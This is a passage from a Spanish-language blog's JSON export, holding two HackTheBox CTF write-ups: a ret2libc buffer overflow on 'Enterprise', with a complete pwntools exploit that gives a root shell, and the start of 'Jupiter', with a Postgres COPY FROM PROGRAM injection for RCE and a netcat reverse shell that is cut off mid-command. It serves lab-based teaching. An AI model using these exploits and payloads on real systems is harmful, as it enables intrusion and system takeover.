AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA zsh: segmentation fault ./lcars Vemos el error segmentation fault asÃ­ que podemos probar de llevar a cabo un buffer overflow\nVamos a usar gdb-peda para verlo mejor gdb ./lcars -q una vez dentro le ponemos una r para ejecutarlo y volvemos a llenar el input de la opciÃ³n 4 para ver si reescribimos los registros.\n[----------------------------------registers-----------------------------------] EAX: 0x2de EBX: 0x41414141 (\u0026#39;AAAA\u0026#39;) ECX: 0xffffcd7c --\u0026gt; 0x38cf2a00 EDX: 0x1 ESI: 0x56555d30 (\u0026lt;__libc_csu_init\u0026gt;:\tpush ebp) EDI: 0xf7ffcba0 --\u0026gt; 0x0 EBP: 0x41414141 (\u0026#39;AAAA\u0026#39;) ESP: 0xffffcf80 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...) EIP: 0x41414141 (\u0026#39;AAAA\u0026#39;) EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) Vemos que efectivamente el EIP vale 0x41414141 que como vimos anteriormente lo que va despuÃ©s del 0x estÃ¡ en hexadecimal, y 41 en hexadecimal es una A, asÃ­ que hemos conseguido reescribirlo.\nAhora el objetivo serÃ­a saber cuantos caracteres tenemos que poner para sobreescribir el EIP y asÃ­ tener control sobre el valor del EIP. gdb-peda tiene una utilidad para detectar el nÃºmero de caracteres necesarios. Primero creamos una cadena de caracteres con pattern_create la cual aunque parezca aleatoria, tiene un sentido, ya que no tiene repeticiones, lo que nos permitirÃ¡ luego encontrar el tamaÃ±o de caracteres para llegar al EIP\n\u0026gt; gdb ./lcars -q Reading symbols from ./lcars... (No debugging symbols found in ./lcars) gdb-peda$ pattern_create 500 \u0026#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A\u0026#39; gdb-peda$ r Enter Security Override: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A [----------------------------------registers-----------------------------------] EAX: 0x216 EBX: 0x73254125 (\u0026#39;%A%s\u0026#39;) ECX: 0xffffcd7c --\u0026gt; 0xaab80000 EDX: 0x1 ESI: 0x56555d30 (\u0026lt;__libc_csu_init\u0026gt;:\tpush ebp) EDI: 0xf7ffcba0 --\u0026gt; 0x0 EBP: 0x41422541 (\u0026#39;A%BA\u0026#39;) ESP: 0xffffcf80 (\u0026#34;nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$A\u0026#34;...) EIP: 0x25412425 (\u0026#39;%$A%\u0026#39;) EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) Ahora nos reporta que el EIP vale ($%$A%) podrÃ­amos contar manualmente o poner el siguiente comando el cual lo cuenta automaticamente\ngdb-peda$ pattern offset $eip 625026085 found at offset: 212 Nos reporta que necesitamos poner 212 caracteres para empezar a sobreescribir el EIP. Podemos comprobar que efectivamente se necesitan 212 caracteres de la siguiente forma:\nPrimero generamos una cadena de texto de 212 â€˜Aâ€™ y le aÃ±adimos 4 â€˜Bâ€™. Si gdb-peda no se ha equivocado el eip deberÃ­a valer â€˜BBBBâ€™\nEnter Security Override: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0xfa EBX: 0x41414141 (\u0026#39;AAAA\u0026#39;) ECX: 0xffffcd7c --\u0026gt; 0xa714c800 EDX: 0x1 ESI: 0x56555d30 (\u0026lt;__libc_csu_init\u0026gt;:\tpush ebp) EDI: 0xf7ffcba0 --\u0026gt; 0x0 EBP: 0x41414141 (\u0026#39;AAAA\u0026#39;) ESP: 0xffffcf80 --\u0026gt; 0x0 EIP: 0x42424242 (\u0026#39;BBBB\u0026#39;) EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) Efectivamente, ha funcionado, el EIP vale â€˜BBBBâ€™. Esto significa que ya tenemos la capacidad de poder manipular el EIP.\nEl siguiente paso serÃ­a ver las protecciones\nProteciones ASLR: AleatorizaciÃ³n de las direcciones de la memoria. Esta protecciÃ³n no es del programa en sÃ­, es una protecciÃ³n del sistema. En los sistemas actuales suele ser raro encontrarlo deshabilitado. Para ver si estÃ¡ habilitado le hacemos un cat al /proc/sys/kernel/randomize_va_space. Si el contenido es un 0, es que estÃ¡ deshabilitado, si no devuelve un 0 es que esta habilitado\nww-data@enterprise:/var/www/html/files$ cat /proc/sys/kernel/randomize_va_space 0 Otra forma de comprobar si el ASLR estÃ¡ habilitado, serÃ­a haciendo un bucle buscando la direcciÃ³n de la librerÃ­a libc y ver si la direcciÃ³n cambia\nwww-data@enterprise:/bin$ for i in `seq 0 20`; do ldd lcars | grep libc; done libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) Como podemos ver, no cambia\nVamos a comprobar mÃ¡s protecciones con checksec.\nchecksec lcars [*] \u0026#39;/home/d3b0o/Desktop/enterprise/lcars\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments NX estÃ¡ deshabilitado asÃ­ que podrÃ­amos crear un shellcode y ponerlo en la pila para despuÃ©s llamarlo desde el EIP, pero un ret2libc es mÃ¡s sencillo.\nEsquema sacado de (https://bufferoverflows.net/ret2libc-exploitation-example/)\nPara llevar a cabo el ret2libc necesitamos la direcciÃ³n de system, /bin/sh y de forma opcional exit. Estas direcciones las podemos encontrar de distintas formas.\nComo la mÃ¡quina tiene gdb, podemos buscar las direcciones con gdb.\nwww-data@enterprise:/bin$ gdb ./lcars -q (gdb) b *main Breakpoint 1 at 0xc91 (gdb) r Starting program: /bin/lcars Breakpoint 1, 0x56555c91 in main () (gdb) p system $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0xf7e4c060 \u0026lt;system\u0026gt; (gdb) p exit $2 = {\u0026lt;text variable, no debug info\u0026gt;} 0xf7e3faf0 \u0026lt;exit\u0026gt; (gdb) find \u0026amp;system,+9999999,\u0026#34;/bin/sh\u0026#34; 0xf7f70a0f En el caso de que no tengamos gdb, podemos usar los siguientes comandos, pero para esta mÃ¡quina no nos sirven porque no tiene el comando strings.\n#/bin/sh strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh #system readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system #exit readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit Exploit â€“\u0026gt; p32812 Ahora ya podemos hacer el exploit. Primero de todo creamos las variables con las direcciones que hemos sacado, creamos una variable con la cantidad de caracteres que vamos a necesitar para llegar al EIP, DespuÃ©s lo juntamos todo, en el orden mencionado anteriormente y lo mandamos por el puerto el cual reporto nmap que estaba abierto y tenÃ­a este binario corriendo. Por Ãºltimo, nos spwaneamos una shell interactiva.\nfrom pwn import * offset = 212 junk = b\u0026#34;A\u0026#34; * offset system = p32(0xf7e4c060) exit = p32(0xf7e3faf0) sh = p32(0xf7f6ddd5) payload = junk + system + exit + sh host, port = \u0026#34;10.10.10.61\u0026#34;, 32812 r = remote(host, port) r.recvuntil(b\u0026#34;Enter Bridge Access Code:\u0026#34;) r.sendline(b\u0026#34;picarda1\u0026#34;) r.recvuntil(b\u0026#34;Waiting for input:\u0026#34;) r.sendline(b\u0026#34;4\u0026#34;) r.recvuntil(b\u0026#34;Enter Security Override\u0026#34;) r.sendline(payload) r.interactive() Â¡Al ejecutarlo, ya somos root!\n\u0026gt; python3 main.py [+] Opening connection to 10.10.10.61 on port 32812: Done [*] Switching to interactive mode : $ whoami root $ ","date":"2023-11-11","id":45,"permalink":"/writeups/hackthebox/enterprise/","summary":"En este writeup vamos a estar resolviendo la mÃ¡quina Enterprise de la plataforma de HackTheBox, Es una mÃ¡quina medium muy interesante, Vamos a estar tocando enumeraciÃ³n web de Wordpress y Joomla, SQL injections, Vamos a escapar de un docker y por Ãºltimo vamos a explotar un Buffer overflow muy interesante con la tÃ©cnica ret2libc","tags":["CTF","RCE","SQLI","Cron","Port forwarding","Python","BoF","ret2libc"],"title":"Enterprise"},{"content":"","date":"2023-11-11","id":46,"permalink":"/tags/port-forwarding/","summary":"","tags":[],"title":"Port forwarding"},{"content":"","date":"2023-11-11","id":47,"permalink":"/tags/python/","summary":"","tags":[],"title":"python"},{"content":"","date":"2023-11-11","id":48,"permalink":"/tags/rce/","summary":"","tags":[],"title":"RCE"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nping -c 1 10.10.11.216 PING 10.10.11.216 (10.10.11.216) 56(84) bytes of data. 64 bytes from 10.10.11.216: icmp_seq=1 ttl=63 time=174 ms --- 10.10.11.216 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 174.469/174.469/174.469/0.000 ms Tenemos conexiÃ³n y en este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.216 -oG allPorts ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobaciÃ³n de sÃ­ la mÃ¡quina estÃ¡ activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nextractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.11.216 5 â”‚ [*] Open ports: 22,80 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts bÃ¡sicos de reconocimientos de nmap\nnmap -p22,80 -sCV 10.10.11.216 -oN versions Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-01 17:21 CET Nmap scan report for 10.10.11.216 Host is up (0.099s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA) |_ 256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://jupiter.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos HTTP El nmap reporto que el puerto 80 estaba abierto y que no se hacÃ­a el redirect a jupiter.htb. Esto significa que el servidor puede estar usando virtual hosting\nQuÃ© es virtual hosting?\rEl virtualhost, o servidor virtual, es una forma de alojamiento web que permite que varias pÃ¡ginas web puedan funcionar en una misma mÃ¡quina. Hay dos tipos de virtualhost:\nLos que se basan en direcciones IP, donde cada pÃ¡gina web tendrÃ¡ una IP diferente. Los que se basan en nombres de dominio, donde una sola direcciÃ³n IP funcionan varias pÃ¡ginas web. DefiniciÃ³n sacada de: https://linube.com/ayuda/articulo/267/que-es-un-virtualhost\nhttp-title: Did not follow redirect to http://jupiter.htb/ Para solucionar esto hay que aÃ±adir en el /etc/hosts la siguiente lÃ­nea:\n10.10.11.216 jupiter.htb Con esto estamos diciendo que el dominio jupiter.htb hace referencia a la ip 10.10.11.216. Ahora ya podemos acceder a la web desde el navegador. La web no tiene nada interesante, asi que vamos a buscar subdominios, para ello podemos usar muchas herramientas, pero voy a usar wfuzz\nwfuzz -c -t 20 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H \u0026#34;Host: FUZZ.jupiter.htb\u0026#34; http://jupiter.htb/ ExplicaciÃ³n parÃ¡metros\r-c: Mostrar el resultado con colores -t: Definir el tiempo del escaneo -w: Diccionario -H: Especificar un header FUZZ: Es donde va a ir probando el contenido del diccionario Este comando nos muestra muchos subdominios, pero todos tienen cÃ³digo 301, 178 caracteres, 12 palabras y 7 lÃ­neas\n===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 301 7 L 12 W 178 Ch \u0026#34;www\u0026#34; 000000045: 301 7 L 12 W 178 Ch \u0026#34;www1\u0026#34; 000000042: 301 7 L 12 W 178 Ch \u0026#34;static\u0026#34; 000000015: 301 7 L 12 W 178 Ch \u0026#34;ns\u0026#34; 000000003: 301 7 L 12 W 178 Ch \u0026#34;ftp\u0026#34; 000000031: 301 7 L 12 W 178 Ch \u0026#34;mobile\u0026#34; 000000044: 301 7 L 12 W 178 Ch \u0026#34;web\u0026#34; 000000046: 301 7 L 12 W 178 Ch \u0026#34;img\u0026#34; 000000041: 301 7 L 12 W 178 Ch \u0026#34;dns1\u0026#34; 000000043: 301 7 L 12 W 178 Ch \u0026#34;lists\u0026#34; 000000040: 301 7 L 12 W 178 Ch \u0026#34;ns4\u0026#34; 000000007: 301 7 L 12 W 178 Ch \u0026#34;webdisk\u0026#34; 000000039: 301 7 L 12 W 178 Ch \u0026#34;dns2\u0026#34; ... Lo que podemos hacer es aÃ±adir el parÃ¡metro -hh=178 para ocultar las respuestas con 178 caracteres.\nwfuzz -c -t 20 --hh=178 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H \u0026#34;Host: FUZZ.jupiter.htb\u0026#34; http://jupiter.htb/ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000001955: 200 211 L 798 W 34390 Ch \u0026#34;kiosk\u0026#34; Ahora ya nos reporta un subdominio, kiosk, para poder verlo tenemos que aÃ±adirlo en el /etc/hosts de la siguiente forma\n10.10.11.216 jupiter.htb kiosk.jupiter.htb Al entrar a kiosk.jupiter.htb, vemos una web hecha con Grafana, concretamente si nos vamos al login vemos que es un grafana v9.5.2.\nEn la pÃ¡gina principal, si nos vamos a cualquier apartado y le damos a los 3 puntos \u0026gt; inspeccionar \u0026gt; Panel JSON, vemos lo siguiente:\n{ \u0026#34;datasource\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;postgres\u0026#34;, \u0026#34;uid\u0026#34;: \u0026#34;YItSLg-Vz\u0026#34; }, \u0026#34;fieldConfig\u0026#34;: { \u0026#34;defaults\u0026#34;: { \u0026#34;mappings\u0026#34;: [], \u0026#34;thresholds\u0026#34;: { \u0026#34;mode\u0026#34;: \u0026#34;percentage\u0026#34;, \u0026#34;steps\u0026#34;: [ { \u0026#34;color\u0026#34;: \u0026#34;green\u0026#34;, \u0026#34;value\u0026#34;: null }, { \u0026#34;color\u0026#34;: \u0026#34;orange\u0026#34;, \u0026#34;value\u0026#34;: 70 }, { \u0026#34;color\u0026#34;: \u0026#34;red\u0026#34;, \u0026#34;value\u0026#34;: 85 } ] }, \u0026#34;color\u0026#34;: { \u0026#34;mode\u0026#34;: \u0026#34;thresholds\u0026#34; } }, \u0026#34;overrides\u0026#34;: [] }, \u0026#34;gridPos\u0026#34;: { \u0026#34;h\u0026#34;: 8, \u0026#34;w\u0026#34;: 12, \u0026#34;x\u0026#34;: 0, \u0026#34;y\u0026#34;: 24 }, \u0026#34;id\u0026#34;: 30, \u0026#34;options\u0026#34;: { \u0026#34;reduceOptions\u0026#34;: { \u0026#34;values\u0026#34;: false, \u0026#34;calcs\u0026#34;: [ \u0026#34;lastNotNull\u0026#34; ], \u0026#34;fields\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;orientation\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;textMode\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;colorMode\u0026#34;: \u0026#34;value\u0026#34;, \u0026#34;graphMode\u0026#34;: \u0026#34;area\u0026#34;, \u0026#34;justifyMode\u0026#34;: \u0026#34;auto\u0026#34; }, \u0026#34;pluginVersion\u0026#34;: \u0026#34;9.5.2\u0026#34;, \u0026#34;targets\u0026#34;: [ { \u0026#34;datasource\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;postgres\u0026#34;, \u0026#34;uid\u0026#34;: \u0026#34;YItSLg-Vz\u0026#34; }, \u0026#34;editorMode\u0026#34;: \u0026#34;code\u0026#34;, \u0026#34;format\u0026#34;: \u0026#34;table\u0026#34;, \u0026#34;hide\u0026#34;: false, \u0026#34;rawQuery\u0026#34;: true, \u0026#34;rawSql\u0026#34;: \u0026#34;select \\n count(parent) \\nfrom \\n moons \\nwhere \\n parent = \u0026#39;Jupiter\u0026#39;;\u0026#34;, \u0026#34;refId\u0026#34;: \u0026#34;A\u0026#34;, \u0026#34;sql\u0026#34;: { \u0026#34;columns\u0026#34;: [ { \u0026#34;parameters\u0026#34;: [], \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34; } ], \u0026#34;groupBy\u0026#34;: [ { \u0026#34;property\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34; }, \u0026#34;type\u0026#34;: \u0026#34;groupBy\u0026#34; } ], \u0026#34;limit\u0026#34;: 50 } } ], \u0026#34;title\u0026#34;: \u0026#34;Number of Moons\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;stat\u0026#34; } Teniendo esto, nos podemos fijar en que la base de datos es postgres y que se estÃ¡ haciendo una peticiÃ³n a la base de datos:\nselect \\n count(parent) \\nfrom \\n moons \\nwhere \\n parent = \u0026#39;Jupiter\u0026#39;; Si volvemos a la pÃ¡gina principal y hacemos ctrl + shift + c y vamos al apartado Red podemos ver que a medida que vamos scroleando se van haciendo peticiones. Vamos a interceptarlas con burpsuite.\nPOST /api/ds/query HTTP/1.1 Host: kiosk.jupiter.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0 Accept: application/json, text/plain, */* Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate, br Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1\u0026amp;refresh=1d ... {\u0026#34;queries\u0026#34;:[{\u0026#34;refId\u0026#34;:\u0026#34;A\u0026#34;,\u0026#34;datasource\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;postgres\u0026#34;,\u0026#34;uid\u0026#34;:\u0026#34;YItSLg-Vz\u0026#34;},\u0026#34;rawSql\u0026#34;:\u0026#34;select \\n count(parent) \\nfrom \\n moons \\nwhere \\n parent = \u0026#39;Jupiter\u0026#39;;\u0026#34;,\u0026#34;format\u0026#34;:\u0026#34;table\u0026#34;,\u0026#34;datasourceId\u0026#34;:1,\u0026#34;intervalMs\u0026#34;:60000,\u0026#34;maxDataPoints\u0026#34;:928}],\u0026#34;range\u0026#34;:{\u0026#34;from\u0026#34;:\u0026#34;2023-11-01T11:31:09.304Z\u0026#34;,\u0026#34;to\u0026#34;:\u0026#34;2023-11-01T17:31:09.304Z\u0026#34;,\u0026#34;raw\u0026#34;:{\u0026#34;from\u0026#34;:\u0026#34;now-6h\u0026#34;,\u0026#34;to\u0026#34;:\u0026#34;now\u0026#34;}},\u0026#34;from\u0026#34;:\u0026#34;1698838269304\u0026#34;,\u0026#34;to\u0026#34;:\u0026#34;1698859869304\u0026#34;} En la peticiÃ³n interceptada podemos ver la peticiÃ³n que se estÃ¡ haciendo a la base de datos Postgres\nIntrusiÃ³n Para saber como hacer una inyecciÃ³n a un PostgreSQL existe un recurso muy interesante de la repo de Payloads All The Things, en el cual se menciona una vulnerabilidad interesante que consiste en derivar la inyecciÃ³n sql a un rce (Remote Code Execution)\nBÃ¡sicamente, consiste en crear una tabla en la base de datos en uso por la web\nCREATE TABLE cmd_exec(cmd_output text); Mediante COPY se pondrÃ¡ en la tabla el resultado del comando id, lo que provocarÃ¡ que se ejecute el comando Ã¬d\nCOPY cmd_exec FROM PROGRAM \u0026#39;id\u0026#39;; De forma opcional, en el caso de que podamos ver el output lo podrÃ­amos ver simplemente haciendo una peticiÃ³n a la tabla cmd_exec\nSELECT * FROM cmd_exec; Sabiendo esto vamos con la explotaciÃ³n:\nCreamos la tabla cmd_exec\n\u0026#34;rawSql\u0026#34;:\u0026#34;CREATE TABLE cmd_exec(cmd_output text);\u0026#34; Ahora nos ponemos en escucha por la interfaz tun0 a la espera de paquetes icmp que son los que usa ping.\nsudo tcpdump -i tun0 icmp Por Ãºltimo mandamos la inyecciÃ³n para ejecutar un ping a nuestra mÃ¡quina\n\u0026#34;rawSql\u0026#34;:\u0026#34;COPY cmd_exec FROM PROGRAM \u0026#39;ping -c 1 10.10.14.28\u0026#39;;\u0026#34; El servidor nos responde con un status 200\n{\u0026#34;results\u0026#34;:{\u0026#34;A\u0026#34;:{\u0026#34;status\u0026#34;:200,\u0026#34;frames\u0026#34;:[]}}} Y vemos que se ha hecho el ping correctamente, lo que significa que tenemos capacidad de ejecutar comandos en la mÃ¡quina vÃ­ctima\n18:47:24.492218 IP jupiter.htb \u0026gt; 10.10.14.28: ICMP echo request, id 2, seq 1, length 64 18:47:24.492238 IP 10.10.14.28 \u0026gt; jupiter.htb: ICMP echo reply, id 2, seq 1, length 64 Reverse shell Vamos a ponernos en escucha con netcat por el puerto 443\nnc -nlvp 443 ExplicaciÃ³n parÃ¡metros\rn: Sirve para que no haga la resoluciÃ³n de DNS l: Habilitar modo escucha de netcat v: Verbose, modo detallado de netcat p: Por Ãºltimo la p sirve para especificar el nÃºmero de puerto en el cual vamos a estar en escucha La revershell la vamos a mandar con bash: bash -i \u0026gt;\u0026amp; 